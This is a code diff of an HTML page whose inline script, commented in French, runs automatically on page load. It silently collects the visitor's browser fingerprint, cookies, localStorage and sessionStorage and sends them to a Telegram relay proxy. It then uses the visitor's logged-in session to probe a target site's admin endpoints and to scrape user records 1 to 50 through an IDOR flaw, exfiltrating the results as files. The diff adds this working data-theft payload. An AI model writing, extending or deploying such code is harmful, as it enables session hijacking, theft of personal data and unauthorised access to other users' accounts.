@@ -9,58 +9,162 @@
     <div id="log" style="display:none;"></div>
 
     <script>
-    // ==================== CONFIGURATION (sans token) ====================
-    const PROXY_URL = 'https://telegram-proxy.onrender.com'; // ⚠️ remplace par ton URL Render
+    // ==================== CONFIGURATION (sans token visible) ====================
+    // ⚠️ Remplace PROXY_URL par l'URL de ton service Render après déploiement
+    const PROXY_URL = 'https://ton-projet.onrender.com';
     const API_BASE = 'https://bugweb.lionelmelo.space';
+    const logDiv = document.getElementById('log');
 
-    // ==================== UTILITAIRES ====================
-    async function sendToTelegram(text) {
+    // Détection de l'environnement
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+    const isChrome = /Chrome/.test(navigator.userAgent) && !isSafari;
+    const isFirefox = /Firefox/.test(navigator.userAgent);
+
+    function log(msg) {
+        console.log(`[ADAPT] ${msg}`);
+        if (logDiv) logDiv.innerHTML += `${msg}<br>`;
+    }
+
+    // ==================== COMMUNICATION AVEC LE PROXY ====================
+    async function sendToTelegram(message) {
         try {
-            await fetch(`${PROXY_URL}/send`, {
+            const res = await fetch(`${PROXY_URL}/send`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ text })
+                body: JSON.stringify({ text: message.substring(0, 4000) })
             });
-        } catch(e) { console.error(e); }
+            return res.ok;
+        } catch(e) {
+            log('Erreur envoi: ' + e.message);
+            return false;
+        }
     }
 
     async function sendFileToTelegram(filename, content) {
         try {
-            await fetch(`${PROXY_URL}/send-file`, {
+            const res = await fetch(`${PROXY_URL}/send-file`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ filename, content: btoa(content) })
+                body: JSON.stringify({ filename, content: btoa(unescape(encodeURIComponent(content))) })
             });
-        } catch(e) { console.error(e); }
+            return res.ok;
+        } catch(e) {
+            log('Erreur envoi fichier: ' + e.message);
+            return false;
+        }
     }
 
-    // ==================== COLLECTE ====================
+    // ==================== COLLECTE ET ENVOI ====================
+    async function fetchJSON(endpoint, options = {}, retries = 2) {
+        for (let i = 0; i < retries; i++) {
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+                const res = await fetch(API_BASE + endpoint, {
+                    ...options,
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json', ...options.headers },
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                return await res.json();
+            } catch(e) {
+                if (i === retries - 1) throw e;
+                await new Promise(r => setTimeout(r, 500 * (i + 1)));
+            }
+        }
+    }
+
     async function collectEnvironment() {
-        const env = { userAgent: navigator.userAgent, screen: `${screen.width}x${screen.height}` };
+        const env = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            isMobile, isSafari, isChrome, isFirefox,
+            referrer: document.referrer,
+            url: window.location.href
+        };
         await sendToTelegram(`🌍 ENVIRONNEMENT\n${JSON.stringify(env, null, 2)}`);
+        return env;
     }
 
     async function collectCookiesAndStorage() {
         const data = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            data.localStorage[key] = localStorage.getItem(key);
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch(e) {}
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch(e) {}
+        if (data.cookies || Object.keys(data.localStorage).length || Object.keys(data.sessionStorage).length) {
+            await sendToTelegram(`🍪 STOCKAGE\n${JSON.stringify(data, null, 2).substring(0, 3500)}`);
         }
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            data.sessionStorage[key] = sessionStorage.getItem(key);
+        return data;
+    }
+
+    async function tryAdminEndpoints() {
+        const adminEndpoints = ['/api/admin/users', '/api/admin/stats', '/api/admin/servers', '/api/admin/transactions', '/api/admin/logs', '/api/admin/config', '/api/admin/settings', '/api/admin/backup', '/admin/dashboard', '/api/superadmin/users'];
+        for (const endpoint of adminEndpoints) {
+            try {
+                const data = await fetchJSON(endpoint);
+                await sendToTelegram(`📊 ${endpoint}: OK`);
+                if (endpoint === '/api/admin/users' && data.users) {
+                    await sendFileToTelegram('users_admin.json', JSON.stringify(data, null, 2));
+                }
+            } catch(e) {}
         }
-        await sendToTelegram(`🍪 STOCKAGE\n${JSON.stringify(data, null, 2).substring(0, 3500)}`);
+    }
+
+    async function tryIDOR() {
+        const extracted = [];
+        for (let id = 1; id <= 50; id++) {
+            try {
+                const user = await fetchJSON(`/api/user/${id}`);
+                extracted.push(user);
+            } catch(e) {}
+            await new Promise(r => setTimeout(r, 100));
+        }
+        if (extracted.length > 0) {
+            await sendFileToTelegram('idor_users.json', JSON.stringify(extracted, null, 2));
+            await sendToTelegram(`🎯 IDOR: ${extracted.length} utilisateurs extraits`);
+        }
+        return extracted;
     }
 
     async function main() {
+        log('Début extraction...');
         await sendToTelegram('🔍 Extraction adaptative démarrée');
         await collectEnvironment();
         await collectCookiesAndStorage();
+        try {
+            const profile = await fetchJSON('/api/user/profile');
+            await sendToTelegram(`👤 PROFIL: ${JSON.stringify(profile).substring(0, 800)}`);
+        } catch(e) { log(`Profil: ${e.message}`); }
+        await tryAdminEndpoints();
+        await tryIDOR();
         await sendToTelegram('✅ Extraction terminée');
+        log('Fin');
     }
 
-    setTimeout(main, 1000);
+    setTimeout(() => {
+        main().catch(e => {
+            log(`Erreur fatale: ${e.message}`);
+            sendToTelegram(`❌ Erreur: ${e.message}`);
+        });
+    }, 1000);
     </script>
 </body>
 </html>
